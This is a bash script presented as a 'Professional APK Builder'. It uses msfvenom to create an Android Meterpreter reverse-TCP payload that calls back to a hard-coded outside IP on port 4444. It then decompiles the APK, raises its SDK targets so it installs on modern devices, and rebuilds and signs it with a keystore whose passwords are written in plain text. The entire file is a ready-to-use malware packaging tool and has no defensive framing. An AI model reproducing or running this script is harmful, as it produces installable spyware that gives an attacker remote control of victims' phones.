#!/bin/bash

# Professional APK Builder with SDK 30
# Supports Android 7.0+ (API 24+)

LHOST="208.77.244.15"
LPORT="4444"
PAYLOAD_TYPE="$1"
OUTPUT_NAME="$2"

if [ -z "$PAYLOAD_TYPE" ] || [ -z "$OUTPUT_NAME" ]; then
    echo "Usage: $0 <payload_type> <output_name>"
    echo "Example: $0 android/meterpreter/reverse_tcp MyApp"
    exit 1
fi

echo "════════════════════════════════════════════════════════════"
echo "  Building: $OUTPUT_NAME"
echo "  Payload: $PAYLOAD_TYPE"
echo "════════════════════════════════════════════════════════════"

# Step 1: Generate base APK
echo "[1/6] Generating base APK..."
msfvenom -p "$PAYLOAD_TYPE" \
  LHOST=$LHOST \
  LPORT=$LPORT \
  -o "${OUTPUT_NAME}_base.apk" 2>&1 | grep -E "(Payload|Saved)"

# Step 2: Decompile
echo "[2/6] Decompiling..."
rm -rf "${OUTPUT_NAME}_decompiled" 2>/dev/null
apktool d "${OUTPUT_NAME}_base.apk" -o "${OUTPUT_NAME}_decompiled" -f 2>&1 | grep -E "(I:|W:)"

# Step 3: Update SDK version
echo "[3/6] Updating SDK to 24/30..."
sed -i 's/android:minSdkVersion="[0-9]*"/android:minSdkVersion="24"/' "${OUTPUT_NAME}_decompiled/AndroidManifest.xml"
sed -i 's/android:targetSdkVersion="[0-9]*"/android:targetSdkVersion="30"/' "${OUTPUT_NAME}_decompiled/AndroidManifest.xml"

# Step 4: Rebuild
echo "[4/6] Rebuilding..."
apktool b "${OUTPUT_NAME}_decompiled" -o "${OUTPUT_NAME}_rebuilt.apk" 2>&1 | grep -E "(I:)"

# Step 5: Zipalign
echo "[5/6] Zipaligning..."
zipalign -f 4 "${OUTPUT_NAME}_rebuilt.apk" "${OUTPUT_NAME}_aligned.apk"

# Step 6: Sign with apksigner
echo "[6/6] Signing with apksigner..."
apksigner sign \
  --ks android-release.keystore \
  --ks-key-alias androidkey \
  --ks-pass pass:android123 \
  --key-pass pass:android123 \
  --out "${OUTPUT_NAME}_FINAL.apk" \
  "${OUTPUT_NAME}_aligned.apk" 2>&1

# Verify
echo ""
echo "════════════════════════════════════════════════════════════"
if apksigner verify "${OUTPUT_NAME}_FINAL.apk" 2>&1 | grep -q "Verifies"; then
    echo "✅ SUCCESS: ${OUTPUT_NAME}_FINAL.apk"
    ls -lh "${OUTPUT_NAME}_FINAL.apk"
    md5sum "${OUTPUT_NAME}_FINAL.apk"
else
    echo "❌ FAILED: Signature verification failed"
fi
echo "════════════════════════════════════════════════════════════"

# Cleanup temp files
rm -rf "${OUTPUT_NAME}_decompiled" "${OUTPUT_NAME}_base.apk" "${OUTPUT_NAME}_rebuilt.apk" "${OUTPUT_NAME}_aligned.apk"
